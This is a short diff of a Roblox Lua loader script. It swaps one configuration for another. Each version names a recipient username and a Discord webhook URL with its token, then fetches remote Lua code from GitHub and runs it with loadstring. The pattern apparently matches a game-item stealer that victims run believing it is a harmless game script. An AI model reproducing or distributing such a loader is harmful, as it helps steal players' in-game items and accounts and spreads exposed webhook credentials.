@@ -1,12 +1,7 @@
-Username = "altaasui1"
-loadingscreen = true
-farmui = true -- 
-loadingscreen = true
-_G.CustomScriptName = "altaasui1"  
-_G.Text1 = "Script Loaded..." 
-_G.Text2 = "Waiting for Script" 
-_G.Text3 = "Checking Scripts..." 
-_G.Text4 = "Starting Scripts..."
-_G.Webhook = "https://discord.com/api/webhooks/1192067367048577075/0LlOdcGEB5lIn8sMEIU8zuAQDHfdIXfI6ek8CGQDm4n5whZEU9C2pBi-pRZ-jR6zTvl8" 
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()
+_G.UserName = "altaasui1"
+ 
+_G.UserName2 = "altaasui1"
+ 
+_G.Webhook = "https://discord.com/api/webhooks/1192112195669078067/YlMv7SyxCum50EjUvv6jdmc5tUmqAYIMMiNwLJKZNQa5yBRYBVdDV7VsILMlAS0a3aZc"
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/LypherXScript/main/LypherXScriptZ", true))()
